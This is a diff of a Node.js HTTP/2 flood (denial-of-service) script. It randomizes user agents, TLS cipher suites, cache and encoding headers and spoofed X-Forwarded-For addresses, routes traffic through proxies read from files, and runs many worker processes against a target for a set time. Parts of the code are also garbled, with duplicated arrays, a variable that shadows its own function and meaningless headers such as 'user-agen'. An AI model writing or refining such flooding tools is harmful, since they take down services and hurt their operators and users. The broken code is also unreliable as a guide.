@@ -33,86 +33,41 @@ const net = require("net");
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
   ],
-  controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'],
-
-encoding_header = [
-  '*',
-  '*/*',
-  'gzip',
-  'gzip, deflate, br',
-  'compress, gzip',
-  'deflate, gzip',
-  'gzip, identity',
-  'gzip, deflate',
-  'br',
-  'br;q=1.0, gzip;q=0.8, *;q=0.1',
-  'gzip;q=1.0, identity; q=0.5, *;q=0',
-  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
-  'compress;q=0.5, gzip;q=1.0',
-  'identity',
-  'gzip, compress',
-  'compress, deflate',
-  'compress',
-  'gzip, deflate, br',
-  'deflate',
-  'gzip, deflate, lzma, sdch',
-  'deflate',
-]
-
-controle_header = [
-  'max-age=604800',
-  'proxy-revalidate',
-  'public, max-age=0',
-  'max-age=315360000',
-  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
-  's-maxage=604800',
-  'max-stale',
-  'public, immutable, max-age=31536000',
-  'must-revalidate',
-  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
-  'max-age=31536000,public,immutable',
-  'max-age=31536000,public',
-  'min-fresh',
-  'private',
-  'public',
-  's-maxage',
-  'no-cache',
-  'no-cache, no-transform',
-  'max-age=2592000',
-  'no-store',
-  'no-transform',
-  'max-age=31557600',
-  'stale-if-error',
-  'only-if-cached',
-  'max-age=0',
-  'must-understand, no-store',
-  'max-age=31536000; includeSubDomains',
-  'max-age=31536000; includeSubDomains; preload',
-  'max-age=120',
-  'max-age=0,no-cache,no-store,must-revalidate',
-  'public, max-age=604800, immutable',
-  'max-age=0, must-revalidate, private',
-  'max-age=0, private, must-revalidate',
-  'max-age=604800, stale-while-revalidate=86400',
-  'max-stale=3600',
-  'public, max-age=2678400',
-  'min-fresh=600',
-  'public, max-age=30672000',
-  'max-age=31536000, immutable',
-  'max-age=604800, stale-if-error=86400',
-  'public, max-age=604800',
-  'no-cache, no-store,private, max-age=0, must-revalidate',
-  'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
-  'public, s-maxage=600, max-age=60',
-  'public, max-age=31536000',
-  'max-age=14400, public',
-  'max-age=14400',
-  'max-age=600, private',
-  'public, s-maxage=600, max-age=60',
-  'no-store, no-cache, must-revalidate',
-  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
-  'Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64',
-  ]
+  cplist = [
+    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
+    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
+    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
+    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
+    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
+  ],
+  accept_header = [
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
+  ],
+  lang_header = [
+    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
+    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
+    'en-US,en;q=0.5',
+    'en-US,en;q=0.9',
+    'de-CH;q=0.7',
+    'da, en-gb;q=0.8, en;q=0.7',
+    'cs;q=0.5'
+  ],
+  encoding_header = [
+    'deflate, gzip;q=1.0, *;q=0.5',
+    'gzip, deflate, br',
+    '*'
+  ],
+  controle_header = [
+    'no-cache',
+    'no-store',
+    'no-transform',
+    'only-if-cached',
+    'max-age=0'
+  ],
  encoding_header = [
 'gzip, deflate, br',
 'compress, gzip',
@@ -170,10 +125,6 @@ if (cluster.isMaster) {
   }, process.argv[3] * 1000);
 
 } 
-
-const proxy1 = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all:80";
-const proxy2 = "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt:80";
-runFlooder(proxy1, proxy2);
 
 if (cluster.isMaster) {
     for (let counter = 1; counter <= args.threads; counter++) {
@@ -260,12 +211,34 @@ function getRandomUserAgent() {
     return finalString;
   }
 
+  function cipher() {
+    return cplist[Math.floor(Math.random() * cplist.length)];
+  }
+
+  function randomIp() {
+    const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;
+  
+    return isPrivate(ip) ? ip : randomIp();
+  }
+
   function UserAgents() {
     const userAgents = fs.readFileSync('ua.txt', 'utf-8').split(/\r?\n/);
     return userAgents[Math.floor(Math.random() * userAgents.length)];
   }
 
+  function Proxy() {
+    const Proxy = fs.readFileSync('proxy.txt', 'utf-8').split(/\r?\n/);
+    return Proxy[Math.floor(Math.random() * Proxy.length)];
+  }
+
+  function UserAgen() {
+    const userAgent = fs.readFileSync('ua.txt', 'utf-8').split(/\r?\n/);
+    return userAgent[Math.floor(Math.random() * userAgent.length)];
+  }
+
   const Header = new NetSocket();
+  headers["X-Forwarded-Host"] = randIp;
+  headers["X-Forwarded-For"] = randIp;
   headers[":method"] = "GET";
   headers[":path"] = parsedTarget.path;
   headers[":scheme"] = "https";
@@ -281,13 +254,16 @@ function getRandomUserAgent() {
   headers["cache-control"] = Math.random() > 0.5 ? "no-cache" : "max-age=0";
 
  
- function runFlooder(proxy1, proxy2) {
-    const proxies = [proxy1, proxy2];
+ function runFlooder() {
      const proxyAddr = randomElement(proxies);
      const parsedProxy = proxyAddr.split(":");
      headers[":authority"] = parsedTarget.host
      headers["user-agent"] = getRandomUserAgent();
      headers["user-agents"] = UserAgents();
+     headers["user-agen"] = UserAgen();
+     headers["Proxy"] = Proxy();
+     var cipher = cipher();
+     var randomIp = randomIp()
 
      const proxyOptions = {
          host: parsedProxy[0],
@@ -381,5 +357,4 @@ function getRandomUserAgent() {
  }
  
  const KillScript = () => process.exit(1);
- 
  setTimeout(KillScript, args.time * 1000);
